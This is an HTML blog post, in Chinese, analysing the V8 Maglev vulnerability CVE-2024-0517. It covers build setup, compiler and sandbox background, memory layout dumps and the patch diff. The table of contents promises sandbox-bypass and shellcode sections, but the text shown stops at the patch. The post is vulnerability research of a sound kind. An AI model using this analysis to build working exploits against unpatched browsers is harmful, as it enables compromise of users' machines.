<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言该漏洞源于 V8 引擎的 Maglev 编译器在处理具有父类的类时的编译机制。在此场景下，编译器需遍历所有父类及其构造函数进行查找，而此过程中引入了安全漏洞，该漏洞的补丁和详细信息可以从chrome issues中来进行查看，下面我们将对此漏洞进行详细的分析以及对v8 shell的提权操作">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-0517">
<meta property="og:url" content="http://example.com/2025/01/18/CVE-2024-0517/index.html">
<meta property="og:site_name" content="蓝桉&#39;s blog">
<meta property="og:description" content="前言该漏洞源于 V8 引擎的 Maglev 编译器在处理具有父类的类时的编译机制。在此场景下，编译器需遍历所有父类及其构造函数进行查找，而此过程中引入了安全漏洞，该漏洞的补丁和详细信息可以从chrome issues中来进行查看，下面我们将对此漏洞进行详细的分析以及对v8 shell的提权操作">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/01/18/CVE-2024-0517/image-20250126160818169.png">
<meta property="og:image" content="http://example.com/2025/01/18/CVE-2024-0517/cve-2024-0517.png">
<meta property="og:image" content="http://example.com/2025/01/18/CVE-2024-0517/image-20250217005255600.png">
<meta property="article:published_time" content="2025-01-18T08:17:51.000Z">
<meta property="article:modified_time" content="2025-02-16T16:54:00.963Z">
<meta property="article:author" content="蓝桉">
<meta property="article:tag" content="v8">
<meta property="article:tag" content="oob">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/01/18/CVE-2024-0517/image-20250126160818169.png">


<link rel="canonical" href="http://example.com/2025/01/18/CVE-2024-0517/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/01/18/CVE-2024-0517/","path":"2025/01/18/CVE-2024-0517/","title":"CVE-2024-0517"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CVE-2024-0517 | 蓝桉's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="蓝桉's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">蓝桉's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">3.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#V8%E5%BC%95%E6%93%8E%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.</span> <span class="nav-text">V8引擎简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Maglev"><span class="nav-number">3.2.</span> <span class="nav-text">Maglev</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubercage"><span class="nav-number">3.3.</span> <span class="nav-text">Ubercage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86"><span class="nav-number">3.4.</span> <span class="nav-text">垃圾收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#V8%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E8%A1%A8%E7%A4%BA"><span class="nav-number">3.5.</span> <span class="nav-text">V8中的对象表示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E9%85%8D%E6%8A%98%E5%8F%A0"><span class="nav-number">4.2.</span> <span class="nav-text">分配折叠</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BuildAllocateFastObject%E5%87%BD%E6%95%B0"><span class="nav-number">4.3.</span> <span class="nav-text">BuildAllocateFastObject函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VisitFindNonDefaultConstructorOrConstruct%E5%87%BD%E6%95%B0"><span class="nav-number">4.4.</span> <span class="nav-text">VisitFindNonDefaultConstructorOrConstruct函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TryBuildFindNonDefaultConstructorOrConstruct%E5%87%BD%E6%95%B0"><span class="nav-number">4.5.</span> <span class="nav-text">TryBuildFindNonDefaultConstructorOrConstruct函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8BOOB"><span class="nav-number">5.2.</span> <span class="nav-text">初始OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-number">5.2.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E5%9C%B0%E5%9D%80"><span class="nav-number">5.2.2.</span> <span class="nav-text">写入地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96GC%E6%8A%97%E6%80%A7"><span class="nav-number">5.2.3.</span> <span class="nav-text">获取GC抗性</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88OOB"><span class="nav-number">5.3.</span> <span class="nav-text">最终OOB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87V8%E6%B2%99%E7%AE%B1"><span class="nav-number">5.4.</span> <span class="nav-text">绕过V8沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cshellcode"><span class="nav-number">5.4.1.</span> <span class="nav-text">执行shellcode</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cexp"><span class="nav-number">5.5.</span> <span class="nav-text">执行exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">5.6.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">蓝桉</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/18/CVE-2024-0517/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="蓝桉">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="蓝桉's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="CVE-2024-0517 | 蓝桉's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2024-0517
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-01-18 16:17:51" itemprop="dateCreated datePublished" datetime="2025-01-18T16:17:51+08:00">2025-01-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-02-17 00:54:00" itemprop="dateModified" datetime="2025-02-17T00:54:00+08:00">2025-02-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞源于 V8 引擎的 Maglev 编译器在处理具有父类的类时的编译机制。在此场景下，编译器需遍历所有父类及其构造函数进行查找，而此过程中引入了安全漏洞，该漏洞的补丁和详细信息可以从<a target="_blank" rel="noopener" href="https://issues.chromium.org/issues/41488920">chrome issues</a>中来进行查看，下面我们将对此漏洞进行详细的分析以及对<code>v8 shell</code>的提权操作</p>
<span id="more"></span>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次我们使用的是<a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/44ac5a4467ca8be9eacd0b868650c9c5f8b0525d^"> e73f620c2ef1230ddaa61551706225821a87c3b9</a>]分支来进行此次的漏洞分析，下面我们来进行简单的环境搭建</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先获取V8源码拉取工具</span></span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HOME</span>/depot_tools:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$HOME/depot_tools:$PATH&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取源码</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git checkout e73f620c2ef1230ddaa61551706225821a87c3b9</span><br><span class="line">gclient <span class="built_in">sync</span> -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># build v8</span></span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;source ~/v8/v8/tools/gdbinit&#x27;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="V8引擎简介"><a href="#V8引擎简介" class="headerlink" title="V8引擎简介"></a>V8引擎简介</h3><p>V8引擎包含<strong>*Ignition(解释器)、Sparkplug(基线编译器)、Maglev(中层优化编译器)和TurboFan(优化编译器)<em>*<em>。</em>Ignition*作为一种寄存器式虚拟机，负责将解析后的</em>*AST</strong>转换为字节码。其优化阶段最关键的步骤之一就是识别<strong>hot code</strong>，随后将这些代码送入<strong>Maglev</strong>进行初步优化。若代码进一步被频繁执行，则会进入<strong>TurboFan</strong>进行深度优化。</p>
<h3 id="Maglev"><a href="#Maglev" class="headerlink" title="Maglev"></a>Maglev</h3><p><strong>Maglev</strong>是位于基线编译器之后和优化编译器之前，其优化决策完全依赖于解释器运行期间收集的反馈数据。为实现静态层面的高效优化，Maglev 通过构建由节点组成的<strong>控制流图（Control Flow Graph, CFG</strong>即 **Maglev 中间表示（Maglev IR)**来支撑其优化流程。</p>
<p>我们可以通过如下代码来进行对其有初步的了解</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(add);</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(add);</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>执行<code>./v8/out/x64.debug/d8 --allow-natives-syntax --print-maglev-graph ./exp/test1.js</code>首先会打印其字节码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x3473000021d8 @    0 : 0b 04             Ldar a1</span><br><span class="line">0x3473000021da @    2 : 3a 03 00          Mul a0, [0]</span><br><span class="line">0x3473000021dd @    5 : ab                Return</span><br></pre></td></tr></table></figure>

<p>然后就会打印其IR图</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Graph</span><br><span class="line"></span><br><span class="line">    1/5: Constant(0x0ad8000c3c89 &lt;NativeContext[285]&gt;) → v-1, live range: [1-10]</span><br><span class="line">    2/4: Constant(0x0ad8000da915 &lt;JSFunction add (sfi = 0xad8000da86d)&gt;) → v-1, live range: [2-10]</span><br><span class="line"> Block b1</span><br><span class="line">0x0ad8000da86d &lt;SharedFunctionInfo add&gt; (0x0ad8001c9479 &lt;String[14]: <span class="string">&quot;./exp/test1.js&quot;</span>&gt;)</span><br><span class="line">   0 : Ldar a1</span><br><span class="line">    3/1: InitialValue(&lt;this&gt;) → [stack:-6|t], live range: [3-10]</span><br><span class="line">    4/2: InitialValue(a0) → [stack:-7|t], live range: [4-10]</span><br><span class="line">    5/3: InitialValue(a1) → [stack:-8|t], live range: [5-10]</span><br><span class="line">    6/7: FunctionEntryStackCheck</span><br><span class="line">         ↳ lazy @-1 (4 live vars)</span><br><span class="line">    7/8: Jump b2</span><br><span class="line">      ↓</span><br><span class="line"> Block b2</span><br><span class="line">     15: GapMove([stack:-7|t] → [rax|R|t])</span><br><span class="line">   2 : Mul a0, [0]</span><br><span class="line">         ↱ eager @2 (5 live vars)</span><br><span class="line">    8/9: CheckedSmiUntag [v4/n2:[rax|R|t]] → [rax|R|w32], live range: [8-10]</span><br><span class="line">     16: GapMove([stack:-8|t] → [rcx|R|t])</span><br><span class="line">         ↱ eager @2 (5 live vars)</span><br><span class="line">   9/10: CheckedSmiUntag [v5/n3:[rcx|R|t]] → [rcx|R|w32], live range: [9-10]</span><br><span class="line">         ↱ eager @2 (5 live vars)</span><br><span class="line">  10/11: Int32MultiplyWithOverflow [v8/n9:[rax|R|w32], v9/n10:[rcx|R|w32]] → [rax|R|w32], live range: [10-12]</span><br><span class="line">   5 : Return</span><br><span class="line">  11/12: ReduceInterruptBudgetForReturn(5)</span><br><span class="line">  12/13: Int32ToNumber [v10/n11:[rax|R|w32]] → [rcx|R|t], live range: [12-13]</span><br><span class="line">     17: GapMove([rcx|R|t] → [rax|R|t])</span><br><span class="line">  13/14: Return [v12/n13:[rax|R|t]]</span><br></pre></td></tr></table></figure>

<p>我们可以很清楚的看到<code>Block b1</code>是入口块，<code>Block b2</code>是主逻辑块，所以控制流就是<code>b1 - b2 - Return</code></p>
<p>关于<code>b1</code>块我们可以清楚的看到其执行的是初始化与安全检查，而<code>b2</code>块则是乘法运算逻辑</p>
<h3 id="Ubercage"><a href="#Ubercage" class="headerlink" title="Ubercage"></a>Ubercage</h3><p><strong>Ubercage</strong>（也称为 <strong>V8 沙盒</strong>，注意区别于 Chrome 沙盒）是 V8 引擎内部引入的一种新型防御机制，其目标是在攻击者成功利用 V8 漏洞后，仍能强制限制内存读写边界。</p>
<p>该机制的设计核心是将 <strong>V8 堆内存</strong>重新定位到一个预保留的虚拟地址空间（称为沙盒）。此设计假设攻击者能够破坏 V8 堆内存，但通过沙盒隔离，将内存访问限制在沙盒内部，从而阻止攻击者在成功利用 V8 漏洞后实现任意代码执行。Ubercage 本质上为 V8 创建了一个<strong>进程内沙盒</strong>，将潜在的任意内存写入转化为受边界约束的写入，且性能开销极低。</p>
<p>Uberage的另一种机制是<strong>代码指针沙盒化</strong>。其实现方式就是从JS对象中移除直接存储的代码指针，改为使用一个索引指向内存中独立隔离区域的代码指针表。</p>
<p>最后，Ubercage 还移除了 <strong>Typed Array 对象中完整的 64 位指针</strong>，此前，攻击者可利用这些对象的<strong>数据指针（backing store）</strong> 构造任意读写原语但，Ubercage 的部署使此攻击路径彻底失效。</p>
<h3 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h3><p>垃圾收集是一个内存的管理过程，是一种自动释放无引用对象内存的管理机制。在V8引擎中，存在新生代和老生代两个概念：当新生代的<strong>From-Speace</strong>被填满时，就会触发新生代的GC清理无用对象，而另外一侧的<strong>To-Speace</strong>则会以相同的方式工作，若对象在经历两次GC之后仍然存活，就会移入老生代空间。可以阅读这个<a target="_blank" rel="noopener" href="https://deepu.tech/memory-management-in-v8/">博客</a>来对此知识有更加深入的了解。</p>
<h3 id="V8中的对象表示"><a href="#V8中的对象表示" class="headerlink" title="V8中的对象表示"></a>V8中的对象表示</h3><p>V8在64位构建的时候会采用指针压缩技术，所有指针在V8堆中均以32位值存储。为了区分当前的值时指针还是小整数(SMI)，V8会采用指针标记机制，即指针的末位设为1，则将该位与V8堆基值相加，解压缩为完成指针，而SMI则会将数值左移一位，末位保留0。读取时右移一位即可，下面我们来看代码具体了解一下。</p>
<p><img src="/2025/01/18/CVE-2024-0517/image-20250126160818169.png"></p>
<p>下面我们查看一下gdb中的内存视图</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### array a</span></span><br><span class="line">DebugPrint: 0x18860004a8a9: [JSArray]</span><br><span class="line"> - map: 0x18860018e601 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x18860018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x188600199c99 &lt;FixedArray[1]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x1886000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x188600000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x188600025d29 &lt;AccessorInfo name= 0x188600000cf1 &lt;String[6]: #length&gt;, data= 0x188600000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x188600199c99 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 15</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">##### 查看elements</span></span><br><span class="line">0x188600199c98: 0x000005dd <span class="comment"># map     0x00000002 #length      0x0000001e # 15     0x0000105d</span></span><br><span class="line">0x188600199ca8: 0x00000000      0x00199c99      0x00000565      0x00000004</span><br><span class="line">0x188600199cb8: 0x00199ca5      0x00199c81      0x000008a1      0x00400000</span><br><span class="line">0x188600199cc8: 0x00000046      0x00199cb1      0x00000e19      0x00000061</span><br><span class="line">0x188600199cd8: 0x00000010      0x00000008      0x00000000      0x2500007a</span><br></pre></td></tr></table></figure>

<p>上图可以看出<code>0x1e</code>右移一位刚好与数组的15对应，下面我们来看b数组</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### array b</span></span><br><span class="line">DebugPrint: 0x18860004a8b9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x188600199d85 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x188600184ae5 &lt;Object map = 0x188600184121&gt;</span><br><span class="line"> - elements: 0x1886000006a5 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x1886000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x188600002981: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#a: 0x188600002981 &lt;String[1]: #a&gt; (const data field 0), location: in-object</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">##### gdb</span></span><br><span class="line">x/30wx 0x18860004a8b9-1</span><br><span class="line">0x18860004a8b8: 0x00199d85 <span class="comment"># map    0x000006a5 # elements  0x000006a5  0x00002981 # Named properties</span></span><br><span class="line">0x18860004a8c8: 0x00000605      0x00010001      0x00000000      0x000006cd</span><br><span class="line">0x18860004a8d8: 0x00002981      0x00000184      0x00000002      0x00000000</span><br><span class="line">0x18860004a8e8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a8f8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a908: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a918: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a928: 0x00000000      0x0000000</span><br></pre></td></tr></table></figure>

<p><strong>V8 对象包含两种属性类型</strong>：</p>
<ol>
<li><strong>数字属性</strong>（如 <code>obj[0]</code>、<code>obj[1]</code>）：<ul>
<li>通常存储在一个由 <strong><code>elements</code> 指针</strong>指向的连续数组中。</li>
</ul>
</li>
<li><strong>命名属性</strong>（如 <code>obj[&quot;a&quot;]</code> 或 <code>obj.a</code>）：<ul>
<li>默认存储在对象自身的内存块内（内联属性）。</li>
<li>当新增属性数量超过默认阈值（通常为 <strong>4 个</strong>）时，后续属性将存储在一个由 <strong><code>properties</code> 指针</strong>指向的连续数组中。</li>
</ul>
</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>惯例我们先从补丁开始看</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-5597</span>,<span class="number">6</span> +<span class="number">5597</span>,<span class="number">7</span> @@</span><br><span class="line">           object = <span class="built_in">BuildAllocateFastObject</span>(</span><br><span class="line">               <span class="built_in">FastObject</span>(new_target_function-&gt;<span class="built_in">AsJSFunction</span>(), <span class="built_in">zone</span>(), <span class="built_in">broker</span>()),</span><br><span class="line">               AllocationType::kYoung);</span><br><span class="line">+          <span class="built_in">ClearCurrentRawAllocation</span>();</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           object = <span class="built_in">BuildCallBuiltin</span>&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">               &#123;<span class="built_in">GetConstant</span>(current_function), new_target&#125;);</span><br></pre></td></tr></table></figure>

